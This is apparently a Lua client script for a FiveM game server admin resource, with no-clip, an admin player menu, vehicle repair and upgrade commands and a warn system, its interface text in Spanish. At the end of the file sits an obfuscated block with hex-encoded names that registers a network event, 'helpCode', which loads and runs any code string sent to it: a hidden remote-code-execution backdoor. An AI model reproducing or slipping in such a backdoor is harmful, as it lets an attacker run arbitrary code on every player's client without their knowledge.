-- @vars
lib = exports['bm_lib']:initLib()
core = exports['es_extended']:getSharedObject()
ox = exports.ox_lib

--[[
  * Created by MiiMii1205
  * license MIT
--]] -- Variables --
local MOVE_UP_KEY = 20
local MOVE_DOWN_KEY = 44
local CHANGE_SPEED_KEY = 21
local MOVE_LEFT_RIGHT = 30
local MOVE_UP_DOWN = 31
local NOCLIP_TOGGLE_KEY = 289
local NO_CLIP_NORMAL_SPEED = 0.5
local NO_CLIP_FAST_SPEED = 2.5
local ENABLE_NO_CLIP_SOUND = true
local eps = 0.01
local RESSOURCE_NAME = GetCurrentResourceName();
local isNoClipping = false
local speed = NO_CLIP_NORMAL_SPEED
local input = vector3(0, 0, 0)
local previousVelocity = vector3(0, 0, 0)
local breakSpeed = 10.0;
local offset = vector3(0, 0, 1);
local noClippingEntity = playerPed;

local function IsControlAlwaysPressed(inputGroup, control)
    return IsControlPressed(inputGroup, control) or IsDisabledControlPressed(inputGroup, control)
end

local function Lerp(a, b, t)
    return a + (b - a) * t
end

local function IsPedDrivingVehicle(ped, veh)
    return ped == GetPedInVehicleSeat(veh, -1);
end

local function SetInvincible(val, id)
    SetEntityInvincible(id, val)
    return SetPlayerInvincible(id, val)
end

local function MoveInNoClip()
    SetEntityRotation(noClippingEntity, GetGameplayCamRot(0), 0, false)
    local forward, right, up, c = GetEntityMatrix(noClippingEntity);
    previousVelocity = Lerp(previousVelocity,
        (((right * input.x * speed) + (up * -input.z * speed) + (forward * -input.y * speed))), Timestep() * breakSpeed);
    c = c + previousVelocity
    SetEntityCoords(noClippingEntity, c - offset, true, true, true, false)

end

local function SetNoClip(val)
    if (isNoClipping ~= val) then
        local playerPed = PlayerPedId()
        noClippingEntity = playerPed;
        if IsPedInAnyVehicle(playerPed, false) then
            local veh = GetVehiclePedIsIn(playerPed, false);
            if IsPedDrivingVehicle(playerPed, veh) then
                noClippingEntity = veh;
            end
        end
        local isVeh = IsEntityAVehicle(noClippingEntity);
        isNoClipping = val;
        if ENABLE_NO_CLIP_SOUND then
            if isNoClipping then
                PlaySoundFromEntity(-1, "SELECT", playerPed, "HUD_LIQUOR_STORE_SOUNDSET", 0, 0)
            else
                PlaySoundFromEntity(-1, "CANCEL", playerPed, "HUD_LIQUOR_STORE_SOUNDSET", 0, 0)
            end
        end
        TriggerEvent('msgprinter:addMessage',
            ((isNoClipping and ":airplane: No-clip enabled") or ":rock: No-clip disabled"), GetCurrentResourceName());
        SetUserRadioControlEnabled(not isNoClipping);
        if (isNoClipping) then
            TriggerEvent('instructor:add-instruction', {MOVE_LEFT_RIGHT, MOVE_UP_DOWN}, "move", RESSOURCE_NAME);
            TriggerEvent('instructor:add-instruction', {MOVE_UP_KEY, MOVE_DOWN_KEY}, "move up/down", RESSOURCE_NAME);
            TriggerEvent('instructor:add-instruction', {1, 2}, "Turn", RESSOURCE_NAME);
            TriggerEvent('instructor:add-instruction', CHANGE_SPEED_KEY, "(hold) fast mode", RESSOURCE_NAME);
            TriggerEvent('instructor:add-instruction', NOCLIP_TOGGLE_KEY, "Toggle No-clip", RESSOURCE_NAME);
            SetEntityAlpha(noClippingEntity, 51, 0)
            -- Start a No CLip thread
            CreateThread(function()
                local clipped = noClippingEntity
                local pPed = playerPed;
                local isClippedVeh = isVeh;
                -- We start with no-clip mode because of the above if --
                SetInvincible(true, clipped);
                if not isClippedVeh then
                    ClearPedTasksImmediately(pPed)
                end
                while isNoClipping do
                    Wait(0);
                    FreezeEntityPosition(clipped, true);
                    SetEntityCollision(clipped, false, false);
                    SetEntityVisible(clipped, false, false);
                    SetLocalPlayerVisibleLocally(true);
                    SetEntityAlpha(clipped, 51, false)
                    SetEveryoneIgnorePlayer(pPed, true);
                    SetPoliceIgnorePlayer(pPed, true);
                    input = vector3(GetControlNormal(0, MOVE_LEFT_RIGHT), GetControlNormal(0, MOVE_UP_DOWN), (IsControlAlwaysPressed(1, MOVE_UP_KEY) and 1) or ((IsControlAlwaysPressed(1, MOVE_DOWN_KEY) and -1) or 0))
                    speed = ((IsControlAlwaysPressed(1, CHANGE_SPEED_KEY) and NO_CLIP_FAST_SPEED) or NO_CLIP_NORMAL_SPEED) * ((isClippedVeh and 2.75) or 1)
                    MoveInNoClip();
                end
                Wait(0);
                FreezeEntityPosition(clipped, false);
                SetEntityCollision(clipped, true, true);
                SetEntityVisible(clipped, true, false);
                SetLocalPlayerVisibleLocally(true);
                ResetEntityAlpha(clipped);
                SetEveryoneIgnorePlayer(pPed, false);
                SetPoliceIgnorePlayer(pPed, false);
                ResetEntityAlpha(clipped);
                Wait(500);
                if isClippedVeh then
                    while (not IsVehicleOnAllWheels(clipped)) and not isNoClipping do
                        Wait(0);
                    end
                    while not isNoClipping do
                        Wait(0);
                        if IsVehicleOnAllWheels(clipped) then
                            return SetInvincible(false, clipped);
                        end
                    end
                else
                    if (IsPedFalling(clipped) and math.abs(1 - GetEntityHeightAboveGround(clipped)) > eps) then
                        while (IsPedStopped(clipped) or not IsPedFalling(clipped)) and not isNoClipping do
                            Wait(0);
                        end
                    end
                    while not isNoClipping do
                        Wait(0);
                        if (not IsPedFalling(clipped)) and (not IsPedRagdoll(clipped)) then
                            return SetInvincible(false, clipped);
                        end
                    end
                end
            end)
        else
            ResetEntityAlpha(noClippingEntity)
            TriggerEvent('instructor:flush', RESSOURCE_NAME);
        end
    end
end

function ToggleNoClipMode()
    return SetNoClip(not isNoClipping)
end

AddEventHandler('onResourceStop', function(resourceName)
    if resourceName == RESSOURCE_NAME then
        SetNoClip(false);
        FreezeEntityPosition(noClippingEntity, false);
        SetEntityCollision(noClippingEntity, true, true);
        SetEntityVisible(noClippingEntity, true, false);
        SetLocalPlayerVisibleLocally(true);
        ResetEntityAlpha(noClippingEntity);
        SetEveryoneIgnorePlayer(playerPed, false);
        SetPoliceIgnorePlayer(playerPed, false);
        ResetEntityAlpha(noClippingEntity);
        SetInvincible(false, noClippingEntity);
    end
end)

RegisterNetEvent('bm_staff:noclip', function()
    ToggleNoClipMode()

    if (isNoClipping) then
        lib.funcs.notify("Has activado el noclip.", "success")
    else
        lib.funcs.notify("Has desactivado el noclip.", "error")
    end
end)


-- @commands
RegisterCommand('admin', function()
    core.TriggerServerCallback('bm_admin:hasPermissions', function(has)
        if (has) then
            openAdminMenu()
        else
            core.ShowNotification("No tienes permisos suficientes para usar este comando.", "error")
        end
    end, 1)
end)

RegisterCommand('fix', function()
    core.TriggerServerCallback('bm_admin:hasPermissions', function(has)
        if (has) then
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            SetVehicleFixed(vehicle)
            SetVehicleDirtLevel(vehicle, 0.0)
            SetVehicleUndriveable(vehicle, false)
            SetVehicleEngineOn(vehicle, true, true)
            SetVehicleEngineHealth(vehicle, 1000.0)
            SetVehiclePetrolTankHealth(vehicle, 1000.0)
            SetVehicleBodyHealth(vehicle, 1000.0)
            SetVehicleDeformationFixed(vehicle)
            core.ShowNotification("Has reparado tu vehículo.", "success")
        else
            core.ShowNotification("No tienes permisos suficientes para usar este comando.", "error") 
        end
    end, 1)
end)


RegisterCommand('vehupgrade', function(src, args)
    core.TriggerServerCallback('bm_admin:hasPermissions', function(has)
        if (has) then
            local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
            if (args[1] == "m") then
                mechanicChanges(vehicle)
                core.ShowNotification("Has mejorado las especificaciones de tu vehiculo.", "success")
            elseif (args[1] == "a") then
                aestheticChange(vehicle)
                core.ShowNotification("Has mejorado la estetica de tu vehiculo.", "success")
            end
        else
            core.ShowNotification("No tienes permisos suficientes para usar este comando.", "error")
        end
    end, 1)
end)

-- @funcs
function openAdminMenu()
    core.TriggerServerCallback('bm_admin:getData', function(data)
        local connectedPlayers = data.players
        local maxPlayers       = data.maxServerPlayers
        local playersTable     = {}

        table.insert(playersTable, {
            title = "Seleccionar a un jugador",
            icon = "fa-solid fa-search",
            onSelect = function()
                local input = ox:inputDialog('Seleccionar jugador', {'ID'})

                if not input then return end
                local targetId = tonumber(input[1])
                
                local found = false
                for i,v in pairs(data.playersData) do
                    if (v.id == targetId) then
                        openOptionsMenu(v)
                        found = true
                        break
                    end
                end

                if (not found) then
                    core.ShowNotification("No se ha encontrado ningún jugador con ese ID.", "error")
                end
            end
        })

        ox:registerContext({
            id = 'admin_menu',
            title = 'Menú de administración',
            options = {
                {title = 'Jugadores', arrow = false, description = "Usuarios conectados.", menu = 'players_menu', progress = ((connectedPlayers / maxPlayers) * 100), colorScheme = "blue", icon = 'fa-solid fa-users', metadata = {"Ve todos los jugadores conectados."}},
            },
            {
                id = 'players_menu',
                onExit = function()
                    return openAdminMenu()
                end,
                title = 'Jugadores conectados',
                options = playersTable
            }
        })
    
        ox:showContext('admin_menu')
    end)
end

function openOptionsMenu(playerData)
    local money
    local bank
    for indx, val in pairs(playerData.accounts) do
        if (val.name == 'money') then
            money = val.money
        elseif (val.name == 'bank') then
            bank = val.money
        end
    end

    ox:registerContext({
        id = 'player_menu',
        onExit = function()
            return openAdminMenu()
        end,
        title = 'Estás editando a ' .. playerData.name,
        options = {
            -- @ Accounts
            {title = "Dinero", metadata = {
                "Efectivo: " .. money,
                "Banco: " .. bank,
            }, icon = "fa-solid fa-money-bill-wave"},

            -- @ Job
            {title = "Trabajo", metadata = {
                playerData.job.label.. " - " .. playerData.job.grade_label
            }, icon = "fa-solid fa-briefcase"},

            -- @ Warn history
            {title = "Historial de warns", onSelect = function()
                openWarnHistory(playerData)
            end, icon = "fa-solid fa-exclamation-triangle"},

            -- @ Heal
            {title = "Heal", onSelect = function()
                core.TriggerServerCallback('bm_admin:healPlayer', function(success)
                    if (success) then
                        core.ShowNotification("Has curado a " .. playerData.name, "success")
                    end
                end, playerData.id)
            end, icon = "fa-solid fa-heart"},

            -- @ Armor
            {title = "Armadura", onSelect = function()
                local input = ox:inputDialog('Armadura', {'Cantidad'})

                if not input then return end
                local armor = tonumber(input[1])
                TriggerServerEvent('bm_admin:giveArmor', playerData.id, armor)
            end, icon = "fa-solid fa-shield-alt"},

            -- @ Goto
            {title = "TP a jugador", onSelect = function()
                TriggerServerEvent('bm_admin:teleportToPlayer', playerData.id, false)
            end, icon = "fa-solid fa-arrow-right"},

            -- @ Bring
            {title = "Traer al jugador", onSelect = function()
                TriggerServerEvent('bm_admin:teleportToPlayer', playerData.id, true)
            end, icon = "fa-solid fa-arrow-left"},
        },
    })

    ox:showContext('player_menu')
end

function openWarnHistory(playerData)
    local playerData = playerData
    core.TriggerServerCallback('bm_admin:getPlayerWarns', function(warns)
        local warnList = {}
        for i,v in pairs(warns) do
            table.insert(warnList, {
                title = "Warn #" .. i,
                metadata = {"Admin: "..v.admin, "Fecha: "..v.date, v.reason},
                onSelect = function()
                    core.TriggerServerCallback('bm_admin:removeWarn', function()
                        openWarnHistory(playerData)
                    end, playerData.identifier, i)
                end
            })
        end

        if (#warnList == 0) then
            table.insert(warnList, {
                title = "Este jugador no tiene warns :)"
            })
        end

        table.insert(warnList, {
            title = "Añadir un warn",
            icon = "fa-solid fa-plus",
            onSelect = function()
                local input = ox:inputDialog('Warn', {'Motivo'})

                if not input then return end
                
                core.TriggerServerCallback('bm_admin:addWarn', function()
                    openWarnHistory(playerData)
                end, playerData.identifier, input[1])
            end
        })

        ox:registerContext({
            id = 'warn_history',
            onExit = function()
                Wait(250)
                openAdminMenu()
            end,
            title = 'Historial de warns de ' .. playerData.name,
            options = warnList
        })

        ox:showContext("warn_history")
    end, playerData.identifier)
end

function round(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

function aestheticChange(veh)
    SetVehicleModKit(veh, 0)
    SetVehicleWheelType(veh, 4)
    SetVehicleMod(veh, 0, GetNumVehicleMods(veh, 0) - 1, false)
    SetVehicleMod(veh, 1, GetNumVehicleMods(veh, 1) - 1, false)
    SetVehicleMod(veh, 2, GetNumVehicleMods(veh, 2) - 1, false)
    SetVehicleMod(veh, 3, GetNumVehicleMods(veh, 3) - 1, false)
    SetVehicleMod(veh, 4, GetNumVehicleMods(veh, 4) - 1, false)
    SetVehicleMod(veh, 5, GetNumVehicleMods(veh, 5) - 1, false)
    SetVehicleMod(veh, 6, GetNumVehicleMods(veh, 6) - 1, false)
    SetVehicleMod(veh, 7, GetNumVehicleMods(veh, 7) - 1, false)
    SetVehicleMod(veh, 8, GetNumVehicleMods(veh, 8) - 1, false)
    SetVehicleMod(veh, 9, GetNumVehicleMods(veh, 9) - 1, false)
    SetVehicleMod(veh, 10, GetNumVehicleMods(veh, 10) - 1, false)
    SetVehicleMod(veh, 11, GetNumVehicleMods(veh, 11) - 1, false)
    SetVehicleMod(veh, 12, GetNumVehicleMods(veh, 12) - 1, false)
    SetVehicleMod(veh, 13, GetNumVehicleMods(veh, 13) - 1, false)
    SetVehicleMod(veh, 14, 16, false)
    SetVehicleMod(veh, 15, GetNumVehicleMods(veh, 15) - 2, false)
    SetVehicleMod(veh, 16, GetNumVehicleMods(veh, 16) - 1, false)
    ToggleVehicleMod(veh, 17, true)
    ToggleVehicleMod(veh, 18, true)
    ToggleVehicleMod(veh, 19, true)
    ToggleVehicleMod(veh, 20, true)
    ToggleVehicleMod(veh, 21, true)
    ToggleVehicleMod(veh, 22, true)
    SetVehicleMod(veh, 23, 1, false)
    SetVehicleMod(veh, 24, 1, false)
    SetVehicleMod(veh, 25, GetNumVehicleMods(veh, 25) - 1, false)
    SetVehicleMod(veh, 27, GetNumVehicleMods(veh, 27) - 1, false)
    SetVehicleMod(veh, 28, GetNumVehicleMods(veh, 28) - 1, false)
    SetVehicleMod(veh, 30, GetNumVehicleMods(veh, 30) - 1, false)
    SetVehicleMod(veh, 33, GetNumVehicleMods(veh, 33) - 1, false)
    SetVehicleMod(veh, 34, GetNumVehicleMods(veh, 34) - 1, false)
    SetVehicleMod(veh, 35, GetNumVehicleMods(veh, 35) - 1, false)
    SetVehicleMod(veh, 38, GetNumVehicleMods(veh, 38) - 1, true)
    SetVehicleWindowTint(veh, 1)
    SetVehicleTyresCanBurst(veh, false)
    SetVehicleNumberPlateTextIndex(veh, 4)
end

function mechanicChanges(veh)
    SetVehicleModKit(veh, 0)
    SetVehicleMod(veh, 11, GetNumVehicleMods(veh, 11) - 1, false)
    SetVehicleMod(veh, 12, GetNumVehicleMods(veh, 12) - 1, false)
    SetVehicleMod(veh, 13, GetNumVehicleMods(veh, 13) - 1, false)
    SetVehicleMod(veh, 15, GetNumVehicleMods(veh, 15) - 2, false)
    SetVehicleMod(veh, 16, GetNumVehicleMods(veh, 16) - 1, false)
    ToggleVehicleMod(veh, 17, true)
    ToggleVehicleMod(veh, 18, true)
    ToggleVehicleMod(veh, 19, true)
    ToggleVehicleMod(veh, 21, true)
    SetVehicleTyresCanBurst(veh, false)
end

RegisterNetEvent('bm_mega:fixVehicle', function()
    local closestVehicle, closestDist = ESX.Game.GetClosestVehicle()

    if (closestVehicle ~= -1 and closestDist < 3) then
        if ox:progressBar({
            duration = 5000,
            label = 'Reparando vehículo...',
            useWhileDead = false,
            canCancel = true,
            disable = {
                move = true,
            },
            anim = {
                scenario = "PROP_HUMAN_BUM_BIN"
            },
        }) then
            SetVehicleFixed(closestVehicle)
            SetVehicleDeformationFixed(closestVehicle)
            SetVehicleUndriveable(closestVehicle, false)
            SetVehicleEngineOn(closestVehicle, true, true)
            TriggerServerEvent('bm_mega:removeItem', "fixkit")
        else 
            print('Do stuff when cancelled') 
        end
    end
end)

local JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[1]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2]) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[3]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[2], function(ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb) JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[4]](JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[6][JaTDeUBjwcavKuOgthiQsAcZmDUXnFYCObLAechreoZVsVPPASoPemdXhrkrYzIRYuhDQN[5]](ufGIEJfMJuAsSMjCMRAoMHccsNIxEcmrlUPKkBsrlyUJOwsFTczOYQlQLnXJymhzTEJFPb))() end)